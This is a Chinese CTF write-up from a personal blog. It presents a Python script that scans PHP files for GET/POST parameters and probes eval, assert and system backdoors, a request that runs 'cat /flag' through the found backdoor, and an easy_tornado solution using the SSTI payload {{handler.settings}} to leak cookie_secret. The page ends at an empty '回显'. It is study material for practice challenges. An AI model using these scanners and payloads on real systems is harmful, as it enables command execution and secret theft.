<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">        readfile(file)</span><br></pre></td></tr></table></figure>

<p>接下来是最重要的函数readfile了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">readfile</span><span class="params">(file)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(path+<span class="string">'/'</span>+file,<span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = str(f.read())					//读取一个文件内容赋值给content</span><br></pre></td></tr></table></figure>

<p>然后嫖赵师傅的获取get和post形参的代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">	start = <span class="number">0</span></span><br><span class="line">    params = &#123;&#125;</span><br><span class="line">    <span class="keyword">while</span> str.find(<span class="string">"$_GET['"</span>, start) != <span class="number">-1</span>:		//找到$_GET[<span class="string">'，返回$的位置</span></span><br><span class="line"><span class="string">        pos2 = str.find("'</span>]<span class="string">", str.find("</span>$_GET[<span class="string">'", start) + 1)   //从找到$后的位置开始找'</span>]，返回<span class="string">'的位置</span></span><br><span class="line"><span class="string">        var = str[str.find("$_GET['</span><span class="string">", start) + 7: pos2]		//根据返回的两个位置，切片，得到形参	</span></span><br><span class="line"><span class="string">        start = pos2 + 1	//开始找下一个$_GET['</span></span><br><span class="line"><span class="string">        params[var] = 'echo("</span>glzjin<span class="string">");'			//给所有形参赋值，比如，XXX = echo("</span>glzjin<span class="string">");</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        # print(var)</span></span><br><span class="line"><span class="string">#post同理</span></span><br><span class="line"><span class="string">    start = 0</span></span><br><span class="line"><span class="string">    data = &#123;&#125;</span></span><br><span class="line"><span class="string">    while str.find("</span>$_POST[<span class="string">'", start) != -1:</span></span><br><span class="line"><span class="string">        pos2 = str.find("'</span>]<span class="string">", str.find("</span>$_POST[<span class="string">'", start) + 1)</span></span><br><span class="line"><span class="string">        var = str[str.find("$_POST['</span><span class="string">", start) + 8: pos2]</span></span><br><span class="line"><span class="string">        start = pos2 + 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        data[var] = 'echo("</span>glzjin<span class="string">");'</span></span><br></pre></td></tr></table></figure>

<p>然后是测试文件中发现的三种可利用函数，eval，assert，system</p>
<p>（先引入request模块）</p>
<figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="title">session</span> = requests.<span class="type">Session</span>()</span><br></pre></td></tr></table></figure>

<p>eval：</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r = session.<span class="built_in">post</span>(<span class="string">'http://127.0.0.1/src/'</span> + <span class="built_in">file</span>, data=data, <span class="built_in">params</span>=<span class="built_in">params</span>)	<span class="comment">	//构成eval(echo("glzjin");)</span></span><br><span class="line">    <span class="keyword">if</span> r.<span class="keyword">text</span>.find(<span class="string">'glzjin'</span>) != <span class="number">-1</span>:</span><br><span class="line">        print(<span class="built_in">file</span> + <span class="string">" found!"</span>)</span><br></pre></td></tr></table></figure>

<p>了解一下requests这个模块，这里的 session.post里头，data应该是post请求的内容，而params应该是get请求的内容</p>
<p>assert:</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">params</span>:</span><br><span class="line">      <span class="built_in">params</span>[i] = <span class="built_in">params</span>[i][:<span class="number">-1</span>]		<span class="comment">	//去掉分号</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">      data[i] = data[i][:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">  r = session.<span class="built_in">post</span>(<span class="string">'http://127.0.0.1/src/'</span> + <span class="built_in">file</span>, data=data, <span class="built_in">params</span>=<span class="built_in">params</span>)	<span class="comment">	//构成asser(echo("glzjin"))</span></span><br><span class="line">  <span class="keyword">if</span> r.<span class="keyword">text</span>.find(<span class="string">'glzjin'</span>) != <span class="number">-1</span>:</span><br><span class="line">      print(<span class="built_in">file</span> + <span class="string">" found!"</span>)</span><br></pre></td></tr></table></figure>

<p>system:</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">params</span>:</span><br><span class="line">	<span class="built_in">params</span>[i] = <span class="string">'echo glzjin'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    data[i] = <span class="string">'echo glzjin'</span></span><br><span class="line"></span><br><span class="line">r = session.<span class="built_in">post</span>(<span class="string">'http://127.0.0.1/src/'</span> + <span class="built_in">file</span>, data=data, <span class="built_in">params</span>=<span class="built_in">params</span>)	<span class="comment">	//构成system(echo glzjin)</span></span><br><span class="line"><span class="keyword">if</span> r.<span class="keyword">text</span>.find(<span class="string">'glzjin'</span>) != <span class="number">-1</span>:</span><br><span class="line">    print(<span class="built_in">file</span> + <span class="string">" found!"</span>)</span><br></pre></td></tr></table></figure>

<p>三种语法对应三种函数的测试</p>
<p>差不多就这样，去测试一下用时，先看赵师傅的多线程用时（没错，对脚本的改进就是这个用时问题）</p>
<p>（嘶~        一开脚本，cpu就100%，）</p>
<p><img src="/2019/07/30/The_Third_Day_for_Web/1564380595459.png" alt="1564380595459"></p>
<p><img src="/2019/07/30/The_Third_Day_for_Web/1564380610278.png" alt="1564380610278"></p>
<p><img src="/2019/07/30/The_Third_Day_for_Web/1564382532801.png" alt="1564382532801"></p>
<p>一共用时679秒，十一分钟多（发现其实三种函数都能引起回显）</p>
<p>然后我们试试我们那个没用多线程的（找点什么事打发时间嘞，，，）</p>
<p>去做了一组四分钟的tabata，然后发现任务管理器里，虽然cup占用率是100，但一次只发现一个windows command processing，而赵师傅的多线程一次是七八个，难道这个脚本要跑一个多小时？</p>
<p>那趁着这个机会，先看看赵师傅的多线程，然后去学学协程</p>
<p>先列出赵师傅脚本中属于多线程的代码</p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> concurrent.futures.thread <span class="keyword">import</span> ThreadPoolExecutor		<span class="comment">//线程池</span></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">mutex = threading.Lock()</span><br><span class="line">mutex.acquire()</span><br><span class="line">mutex.release()</span><br><span class="line"></span><br><span class="line">pool = ThreadPoolExecutor(max_workers=<span class="number">50</span>)		<span class="comment">//设置线程的最大数</span></span><br><span class="line">pool.submit(read_file, <span class="keyword">file</span>)</span><br></pre></td></tr></table></figure>

<ol>
<li><p><code>ThreadPoolExecutor</code>构造实例的时候，传入<code>max_workers</code>参数来设置线程池中最多能同时运行的线程数目。</p>
</li>
<li><p>使用<code>submit</code>函数来提交线程需要执行的任务（函数名和参数）到线程池中，并返回该任务的句柄（类似于文件、画图），注意<code>submit()</code>不是阻塞的，而是立即返回。</p>
</li>
</ol>
<p>​    链接：<a href="https://www.jianshu.com/p/b9b3d66aa0be" target="_blank" rel="noopener">https://www.jianshu.com/p/b9b3d66aa0be</a></p>
<p>然后里面有个锁的概念</p>
<p>当多线程中需要“独占资源”的时候，要使用锁来控制，防止多个线程同时占用资源而出现其他异常。使用锁的时候就调用acquire()方法，以此告诉其他线程，我正在占用该资源，你们要等会；待使用资源后需要释放资源的时候就调用release()方法，告诉其他线程，我已经完成使用该资源了，其他人可以过来使用了。</p>
<p>但我觉得，因为一个线程是在使用某个资源前加的锁，其他线程怎么知道你给谁加了锁，所以是不是，一加锁，其他线程就停了呢？待验证。</p>
<p>这里，我自己的脚本大概要听一下了，一共3002个文件，跑一个文件用时1s，大概真的要50分钟到一个小时了，那我们来试试协程</p>
<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import requests</span><br><span class="line">import <span class="built_in">time</span></span><br><span class="line">import asyncio</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line">path = <span class="string">"D:/phpstudy/PHPTutorial/WWW/src/"</span>  </span><br><span class="line">files = os.listdir(path)  </span><br><span class="line"><span class="meta">#print(len(files))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">async def read_file(file):</span><br><span class="line">    f = open(path + <span class="string">"/"</span> + file);  </span><br><span class="line">    iter_f = iter(f);  </span><br><span class="line">    <span class="built_in">str</span> = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="built_in">in</span> iter_f:  </span><br><span class="line">        <span class="built_in">str</span> = <span class="built_in">str</span> + line</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    start = <span class="number">0</span></span><br><span class="line">    <span class="built_in">params</span> = &#123;&#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">str</span>.<span class="built_in">find</span>(<span class="string">"$_GET['"</span>, start) != -<span class="number">1</span>:</span><br><span class="line">        pos2 = <span class="built_in">str</span>.<span class="built_in">find</span>(<span class="string">"']"</span>, <span class="built_in">str</span>.<span class="built_in">find</span>(<span class="string">"$_GET['"</span>, start) + <span class="number">1</span>)</span><br><span class="line">        var = <span class="built_in">str</span>[<span class="built_in">str</span>.<span class="built_in">find</span>(<span class="string">"$_GET['"</span>, start) + <span class="number">7</span>: pos2]</span><br><span class="line">        start = pos2 + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">params</span>[var] = <span class="string">'echo("glzjin");'</span></span><br><span class="line"></span><br><span class="line">        <span class="meta"># print(var)</span></span><br><span class="line"></span><br><span class="line">    start = <span class="number">0</span></span><br><span class="line">    data = &#123;&#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">str</span>.<span class="built_in">find</span>(<span class="string">"$_POST['"</span>, start) != -<span class="number">1</span>:</span><br><span class="line">        pos2 = <span class="built_in">str</span>.<span class="built_in">find</span>(<span class="string">"']"</span>, <span class="built_in">str</span>.<span class="built_in">find</span>(<span class="string">"$_POST['"</span>, start) + <span class="number">1</span>)</span><br><span class="line">        var = <span class="built_in">str</span>[<span class="built_in">str</span>.<span class="built_in">find</span>(<span class="string">"$_POST['"</span>, start) + <span class="number">8</span>: pos2]</span><br><span class="line">        start = pos2 + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        data[var] = <span class="string">'echo("glzjin");'</span></span><br><span class="line"></span><br><span class="line">        <span class="meta"># print(var)</span></span><br><span class="line"></span><br><span class="line">    <span class="meta"># eval test</span></span><br><span class="line">    r = session.post(<span class="string">'http://127.0.0.1/src/'</span> + file, data=data, <span class="built_in">params</span>=<span class="built_in">params</span>)</span><br><span class="line">    <span class="keyword">if</span> r.<span class="built_in">text</span>.<span class="built_in">find</span>(<span class="string">'glzjin'</span>) != -<span class="number">1</span>:</span><br><span class="line">        print(file + <span class="string">" found!"</span>)</span><br><span class="line">        print(<span class="string">"end at: %s s"</span> % <span class="built_in">time</span>.<span class="built_in">time</span>())</span><br><span class="line">        <span class="keyword">exit</span>()</span><br><span class="line">   <span class="meta"># <span class="meta-keyword">else</span>:</span></span><br><span class="line">        <span class="meta">#print(<span class="meta-string">"1"</span>)</span></span><br><span class="line"></span><br><span class="line">    <span class="meta"># assert test</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="built_in">in</span> <span class="built_in">params</span>:</span><br><span class="line">        <span class="built_in">params</span>[i] = <span class="built_in">params</span>[i][:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="built_in">in</span> data:</span><br><span class="line">        data[i] = data[i][:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    r = session.post(<span class="string">'http://127.0.0.1/src/'</span> + file, data=data, <span class="built_in">params</span>=<span class="built_in">params</span>)</span><br><span class="line">    <span class="keyword">if</span> r.<span class="built_in">text</span>.<span class="built_in">find</span>(<span class="string">'glzjin'</span>) != -<span class="number">1</span>:</span><br><span class="line">        print(file + <span class="string">" found!"</span>)</span><br><span class="line">        print(<span class="string">"end at: %s s"</span> % <span class="built_in">time</span>.<span class="built_in">time</span>())</span><br><span class="line">        <span class="keyword">exit</span>()</span><br><span class="line"></span><br><span class="line">    <span class="meta"># system test</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="built_in">in</span> <span class="built_in">params</span>:</span><br><span class="line">        <span class="built_in">params</span>[i] = <span class="string">'echo glzjin'</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="built_in">in</span> data:</span><br><span class="line">        data[i] = <span class="string">'echo glzjin'</span></span><br><span class="line"></span><br><span class="line">    r = session.post(<span class="string">'http://127.0.0.1/src/'</span> + file, data=data, <span class="built_in">params</span>=<span class="built_in">params</span>)</span><br><span class="line">    <span class="keyword">if</span> r.<span class="built_in">text</span>.<span class="built_in">find</span>(<span class="string">'glzjin'</span>) != -<span class="number">1</span>:</span><br><span class="line">        print(file + <span class="string">" found!"</span>)</span><br><span class="line">        print(<span class="string">"end at: %s s"</span> % <span class="built_in">time</span>.<span class="built_in">time</span>())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">#print(<span class="meta-string">"===================="</span>)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> <span class="variable">__name__</span> == <span class="string">"__main__"</span>:</span><br><span class="line">    print(<span class="string">"start at: %s s"</span> % <span class="built_in">time</span>.<span class="built_in">time</span>())</span><br><span class="line">    loop = asyncio.get_event_loop()</span><br><span class="line">    <span class="keyword">for</span> file <span class="built_in">in</span> files:    </span><br><span class="line">        task = loop.create_task(read_file(file))</span><br><span class="line">    loop.run_until_complete(task)</span><br></pre></td></tr></table></figure>

<p>感觉它跑的也好慢，嘶~是不是哪里出错了。</p>
<p>所以最后还是多线程（虽然python是伪多线程）胜利了？</p>
<p>那最后再改改赵师傅的脚本（也没改多少，就是多输出一个data和params，省的还要审计半天2333）</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xk0SzyKwfzw.php found!</span><br><span class="line">&#123;<span class="symbol">'sDCPHvsvwWo</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'V5th2o3Pea_6O</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'amQ2A0SPU</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'riZH5vvoY</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'ZCBPLk</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'wWMgYch</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'Detx3g1SfCf</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'tastJGHA5De</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'fgUPcHJZvkq</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'ppiJIyg</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'KtpWfYB</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);'&#125;</span><br><span class="line">&#123;<span class="symbol">'z5c_TrB</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'xd0UXc39w</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'DdWk_nXmZTF_Dt</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'dthxTqRPg8YtH</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'ImPVuGCXfrS</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'O0yRgyjaOF7m</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'DeMcscsp</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'YV8nqJDhD</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'EMNPxS2A7</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'kBVLzQEgb</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'Efa5BVG</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'i_QfWB2x1</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'E8NPXbr7Cq</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'zfEddFlxaK_FTO3A</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'qjWSY5fjcgNtb</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'qUVRuZTF27EhUKTI</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);'&#125;</span><br></pre></td></tr></table></figure>

<p>这么多参数，而且三种函数都会有回显，那就每种函数都试过来，（既然已经知道是system函数了，那。。。）</p>
<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="built_in">data</span>=&#123;<span class="string">'sDCPHvsvwWo'</span>: <span class="string">'cat /flag'</span>, <span class="string">'V5th2o3Pea_6O'</span>: <span class="string">'cat /flag'</span>, <span class="string">'amQ2A0SPU'</span>: <span class="string">'cat /flag'</span>, <span class="string">'riZH5vvoY'</span>: <span class="string">'cat /flag'</span>, <span class="string">'ZCBPLk'</span>: <span class="string">'cat /flag'</span>, <span class="string">'wWMgYch'</span>: <span class="string">'cat /flag'</span>, <span class="string">'Detx3g1SfCf'</span>: <span class="string">'cat /flag'</span>, <span class="string">'tastJGHA5De'</span>: <span class="string">'cat /flag'</span>, <span class="string">'fgUPcHJZvkq'</span>: <span class="string">'cat /flag'</span>, <span class="string">'ppiJIyg'</span>: <span class="string">'cat /flag'</span>, <span class="string">'KtpWfYB'</span>: <span class="string">'cat /flag'</span>&#125;</span><br><span class="line"><span class="keyword">params</span>=&#123;<span class="string">'z5c_TrB'</span>: <span class="string">'cat /flag'</span>, <span class="string">'xd0UXc39w'</span>: <span class="string">'cat /flag'</span>, <span class="string">'DdWk_nXmZTF_Dt'</span>: <span class="string">'cat /flag'</span>, <span class="string">'dthxTqRPg8YtH'</span>: <span class="string">'cat /flag'</span>, <span class="string">'ImPVuGCXfrS'</span>: <span class="string">'cat /flag'</span>, <span class="string">'O0yRgyjaOF7m'</span>: <span class="string">'cat /flag'</span>, <span class="string">'DeMcscsp'</span>: <span class="string">'cat /flag'</span>, <span class="string">'YV8nqJDhD'</span>: <span class="string">'cat /flag'</span>, <span class="string">'EMNPxS2A7'</span>: <span class="string">'cat /flag'</span>, <span class="string">'kBVLzQEgb'</span>: <span class="string">'cat /flag'</span>, <span class="string">'Efa5BVG'</span>: <span class="string">'cat /flag'</span>, <span class="string">'i_QfWB2x1'</span>: <span class="string">'cat /flag'</span>, <span class="string">'E8NPXbr7Cq'</span>: <span class="string">'cat /flag'</span>, <span class="string">'zfEddFlxaK_FTO3A'</span>: <span class="string">'cat /flag'</span>, <span class="string">'qjWSY5fjcgNtb'</span>: <span class="string">'cat /flag'</span>, <span class="string">'qUVRuZTF27EhUKTI'</span>: <span class="string">'cat /flag'</span>&#125;</span><br><span class="line">session = requests.Session()</span><br><span class="line">file= <span class="string">'xk0SzyKwfzw.php'</span></span><br><span class="line">s = session.post(<span class="string">'http://web15.buuoj.cn/'</span>+file,<span class="built_in">data</span>=<span class="built_in">data</span>,<span class="keyword">params</span>=<span class="keyword">params</span>)</span><br><span class="line">print(re.search(<span class="string">'flag&#123;(.*?)&#125;'</span>,s.text).<span class="keyword">group</span>())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;flag&#123;us4882vyom353basexu6ai7c0i66gfag&#125;</span><br></pre></td></tr></table></figure>

<p>（啊，这样子下来感觉自己啥也没做啊，凑，wdnmd）</p>
<h3 id="easy-tornado"><a href="#easy-tornado" class="headerlink" title="easy_tornado"></a>easy_tornado</h3><p>这题倒像是个密码学的题</p>
<p>先看hints.txt:</p>
<p>md5(cookie_secret+md5(filename))</p>
<p>那么就有</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bf60e1051f59dbb931208200bcf8c08e=md5(<span class="name">cookie_secret+md5</span>(<span class="name">/hints</span>.txt))</span><br><span class="line"></span><br><span class="line"><span class="number">1e1439</span>df1c0c7eeb9e93a8e44a58bc9f=md5(<span class="name">cookie_secret+md5</span>(<span class="name">/welcome</span>.txt))	</span><br><span class="line"></span><br><span class="line"><span class="number">245</span>a5ccf5543f16709d8c22851af5454=md5(<span class="name">cookie_secret+md5</span>(<span class="name">/flag</span>.txt))</span><br></pre></td></tr></table></figure>

<p>/flag.txt中是</p>
<p>flag in /fllllllllllllag</p>
<p>所以这题逻辑就很简单，整到cookie_secret，构造payload，应该就可以了</p>
<p>那，这个secret怎么整呢？</p>
<p>实在不会，太菜了，不会口算md5</p>
<p>去看了下wp，啊，还是太年轻，welcome里的render有用，报错信息的url</p>
<p>?msg=Error    也算是个提示</p>
<p>正解为：</p>
<p>render是python中的一个渲染函数，渲染变量到模板中，即可以通过传递不同的参数形成不同的页面。<br><a href="https://blog.csdn.net/qq78827534/article/details/80792514" target="_blank" rel="noopener">render函数介绍</a><br><a href="https://www.kancloud.cn/kancloud/python-basic/41712" target="_blank" rel="noopener">tornado模板self.render和模板变量传递</a></p>
<p>测试后发现还有一个error界面，格式为<code>/error?msg=Error</code>，怀疑存在<a href="https://www.freebuf.com/vuls/83999.html" target="_blank" rel="noopener">服务端模板注入攻击 （SSTI）</a></p>
<p>尝试<code>/error?msg=</code><br>在Tornado的前端页面模板中，datetime是指向python中datetime这个模块，Tornado提供了一些对象别名来快速访问对象，可以参考<a href="https://tornado.readthedocs.io/en/latest/guide/templates.html#template-syntax" target="_blank" rel="noopener">Tornado官方文档</a></p>
<p>回显</p>
<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">module</span> <span class="string">'datetime'</span> <span class="keyword">from</span> <span class="string">'/usr/local/lib/python2.7/lib-dynload/datetime.so'</span>&gt;</span><br></pre></td></tr></table></figure>

<p><strong>通过查阅文档发现cookie_secret在Application对象settings属性中</strong>（这个最重要了）还发现self.application.settings有一个别名</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RequestHandler.settings</span><br><span class="line">An alias <span class="keyword">for</span> self<span class="selector-class">.application</span><span class="selector-class">.settings</span>.</span><br></pre></td></tr></table></figure>

<p>handler指向的处理当前这个页面的RequestHandler对象，<br>RequestHandler.settings指向self.application.settings，<br>因此handler.settings指向RequestHandler.application.settings。</p>
<p>构造payload获取cookie_secret</p>
<figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/<span class="keyword">error</span>?msg=&#123;&#123;<span class="keyword">handler</span>.settings&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>(也不知道为啥RequestHandler.application.settings不行，RequestHandler.settings不行，咱也不知道，咱待会自己去查)</p>
<p><a href="https://www.cnblogs.com/bwangel23/p/4858870.html" target="_blank" rel="noopener">https://www.cnblogs.com/bwangel23/p/4858870.html</a></p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">这里我想将的是handler这个对象，handler指向的处理当前这个页面的RequestHandler对象！但我在Tornado的Blog Demo中，发现了这样的语句：</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> &lt;title&gt;</span><br><span class="line"><span class="number">2</span>     &#123;&#123; escape(handler<span class="selector-class">.settings</span>[<span class="string">"blog_title"</span>]) &#125;&#125;</span><br><span class="line"><span class="number">3</span> &lt;/title&gt;</span><br><span class="line">但是奇怪的是RequestHandler中并没有settings这个属性，与RequestHandler关联的Application对象（Requestion.application）才有setting这个属性！</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">后来重新翻了一下文档，发现又是一个别名（URL）：</span><br><span class="line"></span><br><span class="line">RequestHandler.settings</span><br><span class="line"></span><br><span class="line">An alias <span class="keyword">for</span> self<span class="selector-class">.application</span><span class="selector-class">.settings</span>.</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">handler 指向RequestHandler</span><br><span class="line"></span><br><span class="line">而RequestHandler.settings又指向self<span class="selector-class">.application</span><span class="selector-class">.settings</span></span><br><span class="line"></span><br><span class="line">所以handler.settings就指向RequestHandler<span class="selector-class">.application</span><span class="selector-class">.settings</span>了！</span><br></pre></td></tr></table></figure>

<p>（看来这是默认就这么用了似乎2333）</p>
<p>回显：</p>
